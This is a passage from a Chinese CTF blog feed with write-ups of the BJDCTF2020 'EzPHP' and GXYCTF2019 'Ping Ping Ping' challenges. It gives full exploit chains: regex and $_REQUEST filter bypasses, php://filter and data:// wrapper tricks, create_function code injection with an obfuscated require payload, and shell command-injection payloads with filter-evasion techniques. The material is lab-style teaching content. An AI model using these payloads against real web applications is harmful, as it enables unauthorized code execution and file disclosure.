class="hljs-meta">%</span><span class="hljs-number">14</span><span class="hljs-meta">%</span>C<span class="hljs-number">1</span>LYy<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span>F<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>DF<span class="hljs-meta">%</span>E<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>B<span class="hljs-meta">%</span><span class="hljs-number">9</span>E<span class="hljs-meta">%</span><span class="hljs-number">7</span>D<span class="hljs-meta">%</span><span class="hljs-number">04</span>c<span class="hljs-meta">%</span>B<span class="hljs-number">1</span><span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>AFj<span class="hljs-meta">%</span><span class="hljs-number">1</span>E<span class="hljs-meta">%</span><span class="hljs-number">7</span>Ch<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">96</span><span class="hljs-meta">%</span>A<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">5</span>U<span class="hljs-meta">%</span>EB<span class="hljs-symbol">n1</span>q<span class="hljs-meta">%</span>CA<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>BSP&amp;b=<span class="hljs-meta">%</span>D<span class="hljs-number">89</span><span class="hljs-meta">%</span>A<span class="hljs-number">4</span><span class="hljs-meta">%</span>FD<span class="hljs-meta">%</span><span class="hljs-number">14</span><span class="hljs-meta">%</span>EC<span class="hljs-meta">%</span><span class="hljs-number">0</span>EL<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>FEG<span class="hljs-meta">%</span>ED<span class="hljs-meta">%</span><span class="hljs-number">5</span>B<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">7</span>D<span class="hljs-meta">%</span>CAh<span class="hljs-meta">%</span><span class="hljs-number">164</span><span class="hljs-meta">%</span>DFl<span class="hljs-meta">%</span><span class="hljs-number">08</span>Z<span class="hljs-meta">%</span>FA<span class="hljs-meta">%</span><span class="hljs-number">1</span>DA<span class="hljs-meta">%</span><span class="hljs-number">05</span>i<span class="hljs-meta">%</span><span class="hljs-number">29</span><span class="hljs-meta">%</span>C<span class="hljs-number">4</span><span class="hljs-meta">%</span>FF<span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">14</span><span class="hljs-meta">%</span>E<span class="hljs-number">8</span>jk<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>DK<span class="hljs-meta">%</span>DAa<span class="hljs-meta">%</span>FC<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-meta">%</span><span class="hljs-number">5</span>C<span class="hljs-meta">%</span>A<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">95</span>ab<span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>P<span class="hljs-meta">%</span>A<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>B<span class="hljs-meta">%</span><span class="hljs-number">1</span>ET<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">92</span><span class="hljs-meta">%</span><span class="hljs-number">16</span>y<span class="hljs-meta">%</span><span class="hljs-number">29</span><span class="hljs-meta">%</span>CC<span class="hljs-meta">%</span><span class="hljs-number">7</span>DV<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span>FF<span class="hljs-meta">%</span>B<span class="hljs-number">8</span>e<span class="hljs-meta">%</span><span class="hljs-number">7</span>FK<span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">1</span>D<span class="hljs-meta">%</span>DF/a<span class="hljs-meta">%</span>DE<span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span><span class="hljs-number">29</span>o<span class="hljs-meta">%</span><span class="hljs-number">08</span><span class="hljs-meta">%</span>FC<span class="hljs-meta">%</span>C<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">15</span><span class="hljs-meta">%</span>D<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>B<span class="hljs-meta">%</span><span class="hljs-number">14</span><span class="hljs-meta">%</span>C<span class="hljs-number">1</span>LYy<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span>F<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>DF<span class="hljs-meta">%</span>E<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>B<span class="hljs-meta">%</span><span class="hljs-number">9</span>E<span class="hljs-meta">%</span><span class="hljs-number">7</span>D<span class="hljs-meta">%</span><span class="hljs-number">04</span>c<span class="hljs-meta">%</span>B<span class="hljs-number">1</span><span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>AFj<span class="hljs-meta">%</span><span class="hljs-number">9</span>E<span class="hljs-meta">%</span><span class="hljs-number">7</span>Bh<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">96</span><span class="hljs-meta">%</span>A<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">5</span>U<span class="hljs-meta">%</span>EB<span class="hljs-symbol">n1</span>q<span class="hljs-meta">%</span>CA<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>BSP</code></pre><p>ps.有些截断的可以写脚本爆破</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MD5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[BJDCTF2020]EzPHP</title>
    <link href="/2020/02/07/BJDCTF2020-EzPHP/"/>
    <url>/2020/02/07/BJDCTF2020-EzPHP/</url>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><pre><code class="hljs php"><span class="hljs-comment"># 源码</span> <span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);error_reporting(<span class="hljs-number">0</span>); <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123;     <span class="hljs-keyword">if</span> (        preg_match(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])        )          <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); &#125;<span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123;         <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;    &#125; &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123;     <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;         <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))              <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>);     &#125; &#125; <span class="hljs-keyword">if</span> (file_get_contents(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<span class="hljs-keyword">if</span> ( sha1(<span class="hljs-variable">$shana</span>) === sha1(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;    extract(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;&#125; <span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);&#125;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123;     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); &#125; <span class="hljs-keyword">else</span> &#123;     <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); &#125; <span class="hljs-meta">?&gt;</span></code></pre><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><ol><li><p>绕过$_SERVER[‘QUERY_STRING’]</p><pre><code class="hljs php">   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123;        <span class="hljs-keyword">if</span> (           preg_match(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])           )             <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>);    &#125;    绕过对<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]也就是get传入的东西进行过滤，直接url编码就行了，<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]不会转码会直接匹配</code></pre></li><li><p>%0a 换行符绕过</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123; <span class="hljs-comment">//防止RFI</span>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123;         <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;    &#125; &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>); debu要等于aqua_is_cute又要绕过匹配，传    debu=aqua_is_cute%<span class="hljs-number">0</span>a</code></pre></li><li><p>$_REQUEST绕过字母</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123;     <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;         <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))              <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>);     &#125; &#125;在post发与get传入参数相同的键，如    debu=<span class="hljs-number">1</span><span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span> 时post传的值优先级大，数组的话无影响</code></pre></li><li><p>php伪协议绕过</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (file_get_contents(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>); php伪协议，要POST别的东西绕过第<span class="hljs-number">3</span>点，所以用data    file=data:<span class="hljs-comment">//text/plain,debu_debu_aqua</span></code></pre></li><li><p>绕过sha1</p><pre><code class="hljs php"> <span class="hljs-keyword">if</span> ( sha1(<span class="hljs-variable">$shana</span>) === sha1(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )数组绕过</code></pre></li><li><p>create_function()代码注入&amp;<code>require()</code>本地文件包含+用伪协议读源码 构造payload</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123;     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); &#125; <span class="hljs-keyword">else</span> &#123;     <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); &#125; <span class="hljs-meta">?&gt;</span></code></pre><p>联想到create_function()代码注入</p><pre><code class="hljs php"><span class="hljs-comment"># 设flag[code]=create_function</span><span class="hljs-comment"># 传入flag[arg]=&#125;code;//</span><span class="hljs-variable">$myFunc</span>=create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#125;code;//&#x27;</span>)  相当于   ===&gt;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunc</span></span>&#123;    &#125;code;<span class="hljs-comment">//&#125;</span></code></pre><p><code>require()</code>本地文件包含+用伪协议读源码 构造payload</p><pre><code class="hljs php">flag[arg]=<span class="hljs-keyword">require</span>(php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=rea1fl4g.php)</span>                  <span class="hljs-comment">#取反绕过关键字</span>flag[arg]=<span class="hljs-keyword">require</span>(~(%<span class="hljs-number">8</span>f%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>f%c5%d0%d0%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>d%d0%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">9</span>e%<span class="hljs-number">9</span>b%c2%<span class="hljs-number">9</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>d%<span class="hljs-number">8</span>b%d1%<span class="hljs-number">9</span>d%<span class="hljs-number">9</span>e%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>a%c9%cb%d2%<span class="hljs-number">9</span>a%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>a%d0%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">8</span>a%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>a%c2%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">9</span>e%ce%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%cb%<span class="hljs-number">98</span>%d1%<span class="hljs-number">8</span>f%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>f))</code></pre></li><li><p>最终payload</p><pre><code class="hljs llvm">/<span class="hljs-number">1</span>nD<span class="hljs-number">3</span><span class="hljs-keyword">x</span>.php?<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>a&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%31</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%63</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span>&#125;require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<span class="hljs-comment">;//</span>POSTdebu<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;file<span class="hljs-operator">=</span><span class="hljs-number">2</span></code></pre><p>flag base64解码后在源码里有</p></li></ol><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>原版题目出自GXY_CTF “Y1ng’s Baby Code”  里面也讲了很多绕过以及其他的payload</p><p><a href="https://www.gem-love.com/websecurity/770.html">https://www.gem-love.com/websecurity/770.html</a></p><ul><li>绕过$_SERVER[‘QUERY_STRING’]</li><li>“%0a换行污染绕过”</li><li>绕过$_REQUEST的字母匹配</li><li>PHP伪协议</li><li>绕过sha1</li><li>create_function()代码注入</li><li>get_defined_vars()列出所有变量</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BJDCTF2020</tag>
      
      <tag>绕过$_SERVER[&#39;QUERY_STRING&#39;]</tag>
      
      <tag>%0a换行污染绕过</tag>
      
      <tag>绕过$_REQUEST的字母匹配</tag>
      
      <tag>PHP伪协议</tag>
      
      <tag>绕过sha1</tag>
      
      <tag>create_function()代码注入</tag>
      
      <tag>get_defined_vars()列出所有变量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[GXYCTF2019]Ping Ping Ping</title>
    <link href="/2020/02/07/GXYCTF2020-Ping-Ping-Ping/"/>
    <url>/2020/02/07/GXYCTF2020-Ping-Ping-Ping/</url>
    
    <content type="html"><![CDATA[<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><pre><code class="hljs powershell">payload:?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span>`ls`<span class="hljs-comment"># 反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果返回到原来的语句中。</span>payload:?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=lag;a=f;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php<span class="hljs-comment"># 先将falg拆开用变量代替绕过，$IFS代表空格</span></code></pre><p>看这个<br><code>cat$IFS$9index.php</code><br>这个<code>$9</code>我理解为一个变量（没有设置<code>$9</code>所以默认为空），如果没有这个  <code>$IFSindex</code>会被认为是一个变量</p><p><img src="https://s2.ax1x.com/2020/02/07/1gQjBQ.png" alt="1gQjBQ.png"></p><p>如上图 命令变成了cat.php</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p><a href="http://byd.dropsec.xyz/2018/05/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E4%B9%8BLinux%E9%80%9A%E9%85%8D%E7%AC%A6/">命令执行绕过之Linux通配符</a></p><ol><li><p>拼接绕过:a=l;b=s;ab</p></li><li><p>编码绕过</p></li><li><p>单引号和双引号绕过<br>比如：ca’’t flag 或ca””t flag</p></li><li><p>反斜杠绕过<br>比如：ca\t fl\ag</p></li><li><p>利用Shell 特殊变量绕过<br>例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</p><p> <code>ca$1t fla$2g</code></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GXYCTF2019</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[SWPU2019]Web1</title>
    <link href="/2020/02/06/SWPU2019-Web1/"/>
    <url>/2020/02/06/SWPU2019-Web1/</url>
    
